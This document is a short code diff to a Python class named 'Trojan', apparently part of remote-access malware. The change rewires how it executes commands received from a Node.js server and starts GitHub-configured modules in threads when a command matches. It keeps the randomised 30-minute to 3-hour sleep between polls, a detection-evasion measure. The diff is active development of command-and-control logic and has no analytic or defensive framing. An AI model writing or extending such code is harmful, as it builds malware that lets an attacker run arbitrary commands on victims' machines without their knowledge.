@@ -96,12 +96,10 @@ class Trojan:
                 # Execute commands from Node.js server
                 for command in nodejs_config.get('commands', []):
                     self.execute_command(command)
-
-            # Run modules based on GitHub config
-            for task in github_config.get('modules', []):
-                thread = threading.Thread(target=self.module_runner, args=(task['module'],))
-                thread.start()
-                time.sleep(random.randint(1, 10))
+                    for module in github_config.get('modules', []):
+                        if module['enabled'] and module['conditions'].get('execute_on_command') == command:
+                            thread = threading.Thread(target=self.module_runner, args=(module['module'],))
+                            thread.start()
 
             time.sleep(random.randint(30*60, 3*60*60))
 
